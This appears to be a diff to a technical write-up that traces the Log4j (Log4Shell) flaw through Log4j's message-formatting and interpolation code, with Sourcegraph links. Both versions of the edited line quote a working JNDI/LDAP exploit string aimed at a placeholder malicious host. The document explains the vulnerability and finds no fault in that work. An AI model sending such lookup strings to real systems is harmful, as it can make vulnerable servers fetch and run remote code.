@@ -43,7 +43,7 @@ Inside Log4j, there is a method for substituting values in format strings. It lo
 
 https://sourcegraph.com/github.com/apache/logging-log4j2@rel/2.14.1/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.java?L128-134
 
-Further down the call stack, we get into the interpolation logic, which selects a lookup method based on the prefix of the name (`String var`, which contains the value `jndi:ldap://malicious.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=`):
+Further down the call stack, we get into the interpolation logic, which selects a lookup method based on the prefix of the name stored in the argument `String var`, which is `jndi:ldap://malicious.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=`):
 
 https://sourcegraph.com/github.com/apache/logging-log4j2@4b789c8/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java?L212-239
 
